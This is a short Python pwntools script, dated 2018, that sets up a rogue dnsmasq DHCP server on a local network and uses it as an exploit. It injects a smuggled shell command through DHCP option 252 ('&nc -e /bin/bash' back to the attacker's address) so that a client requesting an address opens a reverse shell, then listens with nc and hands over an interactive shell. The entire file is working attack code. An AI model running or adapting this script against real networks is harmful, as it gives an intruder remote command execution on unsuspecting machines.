# /usr/bin/python
# encoding=utf-8
import os
import sys
import time
from pwn import *

# author : xyzz@chamd5.org
# time : 20180520

ip = '192.168.131.52'
port = 1314


# context.log_level='debug'

def pwn(ip, port):
    f = open('dnsmasq.conf', 'w')
    start = ip[:ip.rfind('.')] + '.10'
    end = ip[:ip.rfind('.')] + '.30'
    dnsmasq = '''
        bind-interfaces
        interface=eth0
        except-interface=lo
        dhcp-range={start},{end},22h
        dhcp-option=3,{ip}
        dhcp-option=6,{ip}
        log-queries
        log-facility=/var/log/dnsmasq.log
    '''.format(ip=ip, start=start, end=end)
    f.write(dnsmasq)
    f.close()
    cm = []
    cm.append('ifconfig eth0 {ip} netmask 255.255.255.0 '.format(ip=ip))
    cm.append('route add default gw {ip}'.format(ip=ip))
    cm.append(
        '''dnsmasq -dC dnsmasq.conf --dhcp-option="252,'&nc -e /bin/bash {ip} {port} #"'''.format(ip=ip, port=port))
    q = process('bash')

    for i in range(len(cm) - 1):
        q.sendline(cm[i])
        time.sleep(1)
        # time.sleep(100)
    p = process('bash')
    p.sendline('nc -l -p {port} -v'.format(port=port))
    q.sendline(cm[-1])
    time.sleep(3)
    p.interactive()
    # q.interactive()


if __name__ == '__main__':
    pwn(ip, port)
